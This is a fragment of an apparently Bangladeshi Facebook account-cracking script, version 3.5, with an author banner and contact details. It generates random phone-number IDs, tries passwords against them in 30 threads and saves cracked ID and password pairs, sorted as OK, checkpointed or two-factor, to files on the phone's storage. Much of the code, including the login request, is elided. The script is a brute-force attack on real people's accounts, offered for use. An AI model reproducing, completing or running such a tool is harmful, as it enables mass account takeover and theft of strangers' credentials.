...
##    ##  ##    ## 
##     ##  ###### +RPX
AUTHOR    : MR RAYHAN x SoaceX
FACEBOOK : Rayhan
Whatsapp   : 01614489628
VERSION    : 3.5
                                  NOT:USE ONLY MOBIL DATA♦
...
def Random():
    ...
    print(f"")
    print(' 017 ,013 ,018 ,019')
    print(f" 016 ,014 ,016 ,015")
    ...
    with ThreadPool(max_workers=30) as yaari:    
        ...
        print(f" {WHITE}COUNTRY YOU CHOOSE    : BANGLADISH+PAK ")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/RayhanXRafid-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/RayhanXRafid-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/RayhanXRafid-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[RayhanXRafid] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
